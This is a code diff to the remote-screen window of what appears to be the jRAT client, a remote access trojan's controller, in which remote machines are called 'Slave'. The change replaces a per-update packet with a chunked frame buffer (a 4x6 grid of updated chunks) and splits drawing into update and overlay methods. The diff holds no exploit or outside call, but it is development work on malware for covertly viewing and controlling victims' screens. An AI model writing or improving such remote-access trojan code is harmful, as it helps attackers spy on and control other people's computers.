@@ -4,7 +4,6 @@ import io.jrat.client.ErrorDialog;
 import io.jrat.client.Slave;
 import io.jrat.client.packets.outgoing.Packet12RemoteScreen;
 import io.jrat.client.packets.outgoing.Packet26StopRemoteScreen;
-import io.jrat.client.packets.outgoing.Packet50UpdateRemoteScreen;
 import io.jrat.client.packets.outgoing.Packet91MouseMove;
 import io.jrat.client.packets.outgoing.Packet92MousePress;
 import io.jrat.client.packets.outgoing.Packet93MouseRelease;
@@ -57,6 +56,10 @@ public class FrameRemoteScreen extends BaseFrame {
 	
 	public static final Map<Slave, FrameRemoteScreen> instances = new HashMap<Slave, FrameRemoteScreen>();
 	public static final ImageIcon DEFAULT_RECORD_ICON = new ImageIcon(FrameRemoteScreen.class.getResource("/icons/camera_black.png"));
+	
+	private BufferedImage buffer;
+	
+	public boolean[] updatedChunks = new boolean[getColumns() * getRows()];
 	
 	private int monitor;
 	private int quality;
@@ -309,15 +312,14 @@ public class FrameRemoteScreen extends BaseFrame {
 	}
 	
 	public void sendUpdate() {
-		Packet50UpdateRemoteScreen packet = new Packet50UpdateRemoteScreen(monitor, quality, size);
-		slave.addToSendQueue(packet);
+		buffer = null;
 	}
 
 	public void start() {
 		btnStart.setEnabled(false);
 		btnStop.setEnabled(true);
 			
-		slave.addToSendQueue(new Packet12RemoteScreen(size, quality, monitor));
+		slave.addToSendQueue(new Packet12RemoteScreen(size, quality, monitor, getColumns(), getRows()));
 	}
 	
 	public void stop() {
@@ -351,13 +353,17 @@ public class FrameRemoteScreen extends BaseFrame {
 		}
 	}
 	
-	public void update(BufferedImage image) {
+	public void drawOverlay(BufferedImage image) {
 		screenPane.update(image);
 		threadFps.increase();
 		
 		if (recordFrame.isRecording()) {
 			recordFrame.update(image);
 		}
+	}
+	
+	public void update(BufferedImage image) {
+		screenPane.update(image);
 	}
 
 	public static void show(Slave sl) {
@@ -398,6 +404,7 @@ public class FrameRemoteScreen extends BaseFrame {
 
 	public void setImageSize(int size) {
 		this.size = size;
+		buffer = null;
 		lblSize.setText("Size: " + size + "%");
 	}
 	
@@ -440,4 +447,25 @@ public class FrameRemoteScreen extends BaseFrame {
 	public boolean isRunning() {
 		return btnStop.isEnabled();
 	}
+
+	public BufferedImage getBuffer() {
+		return buffer;
+	}
+
+	public void setBuffer(BufferedImage buffer) {
+		this.buffer = buffer;
+	}
+	
+	public int getColumns() {
+		return 4;
+	}
+	
+	public int getRows() {
+		return 6;
+	}
+
+	public boolean[] getUpdatedChunks() {
+		return updatedChunks;
+	}
+
 }
